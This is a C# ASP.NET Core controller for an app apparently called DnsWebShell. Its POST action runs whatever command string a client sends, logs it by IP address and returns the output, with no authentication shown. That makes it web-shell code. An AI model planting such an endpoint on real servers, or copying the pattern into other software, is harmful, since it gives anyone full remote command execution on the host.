using DnsWebShell.Models;
using Microsoft.AspNetCore.Mvc;

namespace DnsWebShell.Controllers;

public class MainController : Controller
{
	private ApplicationContext _dbContext;
	private CmdProcess _cmd;

	public MainController(ApplicationContext dbContext, CmdProcess cmd)
	{
		_dbContext = dbContext;
		_cmd = cmd;
	}

	public ActionResult Index()
	{
		return View(GetWithUserIps());
	}

	[HttpPost]
	public async Task<string?> PutInCommand(string requestString)
	{
		await _cmd.ExecuteCommand(requestString);

		var requestAddress = HttpContext.Connection.RemoteIpAddress!.ToString();

		_dbContext.ComStrings.Add(new ComString
		{
			Body = requestString,
			Date = DateTime.Now,
			ConnectionName = requestAddress
		});

		await _dbContext.SaveChangesAsync();

		return _cmd.Output + _cmd.Error;
	}

	[HttpPost]
	private List<ComString> GetWithUserIps()
	{
		var requestAddress = HttpContext.Connection.RemoteIpAddress!.ToString(); 

		return _dbContext.ComStrings
				.Where(x => x.ConnectionName == requestAddress)
				.OrderByDescending(x => x.Date)
				.ToList();
	}
}
